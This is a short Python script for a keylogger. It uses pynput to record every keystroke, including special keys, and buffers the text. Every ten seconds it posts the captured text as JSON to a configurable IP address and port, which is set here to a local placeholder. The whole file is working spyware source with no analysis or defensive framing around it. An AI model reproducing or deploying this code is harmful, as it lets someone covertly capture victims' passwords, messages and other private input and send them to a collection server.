from pynput import keyboard
import requests
import json
import threading


text = ""
running =True
lock = threading.Lock()


ip_address = "127.0.0.1"  
port_number = "5000"
time_interval = 10 

print("Keylogger is running\n")

def send_text():
    global text 
    if not running:
        return
    
    threading.Timer(time_interval, send_text).start()  

    with lock:
        if text:
            try:
                payload = json.dumps({"keyboardData": text})
                requests.post(f"http://{ip_address}:{port_number}",data=payload,headers={"Content-Type": "application/json"})
                print(f"[+] Sent: {text}")
                text = ""  
            except Exception as e:
                print(f"[!] Failed to send: {e}")


def on_press(key):
    global text
    global running
    with lock:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif key in (keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,):
            pass
        elif key == keyboard.Key.esc:
            running = False
            return False  
        else:
            try:
                text += key.char 
            except AttributeError:
                text += f"<{key.name}>"  


send_text()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
